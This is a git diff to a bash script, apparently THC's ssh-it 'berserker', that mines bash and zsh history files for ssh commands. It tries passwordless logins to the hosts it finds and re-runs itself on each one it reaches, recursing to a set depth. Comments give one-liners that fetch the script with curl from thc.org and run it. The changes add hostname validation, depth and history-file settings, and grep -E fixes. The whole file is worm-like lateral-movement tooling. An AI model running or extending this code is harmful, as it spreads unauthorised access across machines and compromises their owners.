@@ -111,6 +111,12 @@ funcs_init()
 #      bash -c "$(cat bs)"
 #      export BS="$(curl -fsSL https://thc.org/ssh-it/bs)" && bash -c "$BS"
 #      bash -c "IFS='' BS=\"\$(curl -fsSL https://thc.org/ssh-it/bs)\" && eval \$BS"
+#
+# BS_DEPTH=8       The depth before the berseker stops
+# THC_DEBUG=1      Enable debug output
+# BS_HISTFILE=     The bash history file to use
+# BS_ZSH_HISTFILE= The zsh history file to use
+
 # If this case we can not source funcs and must hope that BS contains ourself.
 BINDIR="$(cd "$(dirname "${0}")" || exit; pwd)"
 if [[ "$0" != "bash" ]]; then
@@ -157,7 +163,7 @@ ERREXIT_CLEANUP()
 }
 
 # Stubs to exract ssh command from history file
-ZSH_HST_SSH="egrep '^:[[:space:]]+[0-9:]+;ssh[[:space:]]+'|cut -d\; -f2-"
+ZSH_HST_SSH="grep -E '^:[[:space:]]+[0-9:]+;ssh[[:space:]]+'|cut -d\; -f2-"
 BASH_HST_SSH="grep '^ssh '"
 
 is_passwordless()
@@ -193,6 +199,7 @@ ssh_key_add()
 ssh_from_history()
 {
 	local oa
+	local hname
 	shift 1 # first arg is 'ssh'
 	
 	IFS=" "
@@ -232,6 +239,25 @@ ssh_from_history()
 	shift $((OPTIND - 1))
 	[[ -z $1 ]] && return
 
+	# ssh @foobar.com
+	[[ "$1" = @* ]] && { DEBUGF "Bad User in '$1'"; return; }
+	# $1 is the user@HOSTNAME.
+	# Extract hostname after @ or keep string if it does not contain '@'
+	#   server
+	#   user@server
+	#   Result: hname="server"
+	hname=${1#*@}
+
+	# Check if hname is valid.
+	[[ -z $hname ]] && { DEBUGF "Contains no hostname: '$1'"; return; }
+	if [[ "$hname" =~ [a-zA-Z] ]]; then
+		# HERE: It's a domain name.
+		# Ignore if invalid characters
+		[[ "$hname" =~ [:/] ]] && { DEBUGF "Hostname contains illegal characters: '$1'"; return; }
+	elif [[ "$hname" =~ [0-9] ]]; then
+		# IP or IPv6 address
+		[[ "$hname" =~ [^0-9.:] ]] && { DEBUGF "Hostname contains illegal characters for an IP: '$1'"; return; }
+	fi
 	CMD+="$1"
 	[[ "${CMD_LIST[*]}" = *"$CMD"* ]] && { DEBUGF "SKIP $CMD"; return; }
 	CMD_LIST+=("$CMD")
@@ -240,7 +266,7 @@ ssh_from_history()
 set_myidonce()
 {
 	command -v hostnamectl >/dev/null && _BS_LOCALID_ROOT="$(hostnamectl | md5sum)" || \
-		_BS_LOCALID_ROOT="$(((ifconfig || ip link show) 2>/dev/null | egrep '(ether|HWaddr)'; hostname)  | md5sum)"
+		_BS_LOCALID_ROOT="$(((ifconfig || ip link show) 2>/dev/null | grep -E '(ether|HWaddr)'; hostname)  | md5sum)"
 
 	if [[ "$UID" -eq 0 ]]; then
 		_BS_LOCALID_USER="$_BS_LOCALID_ROOT"
@@ -572,7 +598,7 @@ for c in "${CMD_LIST[@]}"; do
 			THC_DEBUG=\"$THC_DEBUG\" BS_HISTFILE=\"${BS_HISTFILE}\" BS_DEPTH=\"$BS_DEPTH\" \
 			BS_THIS_DEPTH=\"$((BS_THIS_DEPTH+1))\" bash -c \"\$BS\""; } 2>&1 1>&3 3>&- )"; } 3>&1 || ret=$?
 	nkey="$(echo "$err" | grep -c 'tions that can continue')"
-	# nkey="$(echo "$err" | egrep -c '(Trying private key|ffering public key)')"
+	# nkey="$(echo "$err" | grep -E -c '(Trying private key|ffering public key)')"
 	if [[ $ret -ne 0 ]]; then
 		err="$(echo "$err" | grep -v ^debug | tr -d "\r" )"
 		{ [[ $err = *"ermission"* ]] && MSG_ERROR "Permission denied"; } || \
@@ -601,6 +627,9 @@ for c in "${CMD_LIST[@]}"; do
 		MSG_TRY_COMPLETE "$k"
 		unset last_was_failed
 	fi
+# FIXME: The LOOP_DB that is populated within msg_dispatch is only available outside
+# the for-loop. Thus loops like this wont be detected:
+# A -> B -> C followed by A -> C
 done | msg_dispatch
 
 # [[ -n $last_was_failed ]] && printf "%*s\r" "${COLUMNS}" ""
